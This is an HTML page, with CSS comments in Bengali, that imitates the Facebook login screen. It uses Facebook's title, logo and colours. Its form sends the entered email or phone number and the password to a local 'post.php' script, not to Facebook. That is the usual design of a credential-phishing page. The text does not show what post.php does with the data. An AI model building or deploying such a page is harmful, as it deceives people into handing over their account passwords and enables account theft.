<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        /* মূল ব্যাকগ্রাউন্ড এবং ফন্ট */
        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
        }

        /* কন্টেইনার এবং লগো */
        .login-container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .fb-logo {
            width: 240px;
            margin-bottom: 20px;
        }

        /* লগইন বক্সের ডিজাইন (Shadow & Radius) */
        .login-box {
            background: white;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            border: 1px solid #dddfe2;
        }

        /* ইনপুট ফিল্ডের ডিজাইন */
        input[type="text"], input[type="password"] {
            width: 92%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            outline: none;
            transition: border-color 0.3s;
        }
        input[type="text"]:focus, input[type="password"]:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }

        /* লগইন বাটনের ডিজাইন (Blue Color) */
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .login-btn:hover {
            background-color: #166fe5;
        }

        /* ভুলে যাওয়া পাসওয়ার্ড এবং লিংক */
        .forgot {
            display: block;
            margin-top: 15px;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot:hover {
            text-decoration: underline;
        }

        /* ডিভাইডার লাইন */
        hr {
            margin: 22px 0;
            border: none;
            border-top: 1px solid #dadde1;
        }

        /* নতুন অ্যাকাউন্ট তৈরির বাটন (Green Color) */
        .create-btn {
            background-color: #42b72a;
            color: white;
            padding: 12px 16px;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
            transition: background-color 0.3s;
        }
        .create-btn:hover {
            background-color: #36a420;
        }

        /* নিচের ফুটার সেকশন */
        .footer-text {
            margin-top: 25px;
            font-size: 14px;
            color: #575757;
        }
        .footer-text a {
            color: #1c1e21;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2wsSzeW.svg" alt="Facebook" class="fb-logo">
        
        <div class="login-box">
            <form action="post.php" method="POST">
                <input type="text" name="username" placeholder="Email address or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log In</button>
                <a href="#" class="forgot">Forgotten password?</a>
                <hr>
                <button type="button" class="create-btn">Create new account</button>
            </form>
        </div>

        <p class="footer-text">
            <strong><a href="#">Create a Page</a></strong> for a celebrity, brand or business.
        </p>
    </div>
</body>
</html>
